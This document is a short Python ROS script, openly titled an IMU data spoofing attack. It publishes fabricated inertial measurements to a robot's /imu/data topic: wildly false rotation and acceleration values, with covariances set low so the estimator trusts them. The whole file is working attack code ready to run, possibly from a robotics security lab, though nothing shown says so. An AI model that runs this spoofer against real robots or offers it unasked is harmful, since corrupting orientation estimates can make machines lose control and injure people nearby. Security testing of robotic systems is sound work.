#!/usr/bin/env python3
"""
IMU Data Spoofing Attack
Injects false inertial measurement data to mislead orientation estimation
"""

import rospy
from sensor_msgs.msg import Imu
import math

def imu_spoofing_attack():
    """Execute IMU spoofing attack"""
    try:
        rospy.init_node('imu_spoofer', anonymous=True)
        pub = rospy.Publisher('/imu/data', Imu, queue_size=10)
        rate = rospy.Rate(100)  # IMU typically runs at high frequency
        
        rospy.loginfo("[ATTACK] IMU spoofing started - Publishing false inertial data")
        rospy.loginfo("[ATTACK] False angular velocity: z=10.0 rad/s (rapid rotation)")
        rospy.loginfo("[ATTACK] False linear acceleration: x=50.0 m/s² (impossible acceleration)")
        
        count = 0
        
        while not rospy.is_shutdown():
            fake_imu = Imu()
            fake_imu.header.stamp = rospy.Time.now()
            fake_imu.header.frame_id = "imu_link"
            
            # False angular velocity - robot thinks it's spinning rapidly
            fake_imu.angular_velocity.x = 0.0
            fake_imu.angular_velocity.y = 0.0
            fake_imu.angular_velocity.z = 10.0 + math.sin(count * 0.1) * 5.0
            
            # False linear acceleration - impossible values
            fake_imu.linear_acceleration.x = 50.0 * math.sin(count * 0.05)
            fake_imu.linear_acceleration.y = 20.0 * math.cos(count * 0.05)
            fake_imu.linear_acceleration.z = 9.81  # Keep gravity somewhat realistic
            
            # Set covariances to make data appear confident
            fake_imu.angular_velocity_covariance[0] = 0.01
            fake_imu.angular_velocity_covariance[4] = 0.01
            fake_imu.angular_velocity_covariance[8] = 0.01
            
            fake_imu.linear_acceleration_covariance[0] = 0.01
            fake_imu.linear_acceleration_covariance[4] = 0.01
            fake_imu.linear_acceleration_covariance[8] = 0.01
            
            pub.publish(fake_imu)
            count += 1
            rate.sleep()
            
    except rospy.ROSInterruptException:
        rospy.loginfo("[ATTACK] IMU spoofing stopped")
    except Exception as e:
        rospy.logerr(f"[ATTACK] IMU spoofing failed: {str(e)}")

if __name__ == '__main__':
    imu_spoofing_attack()
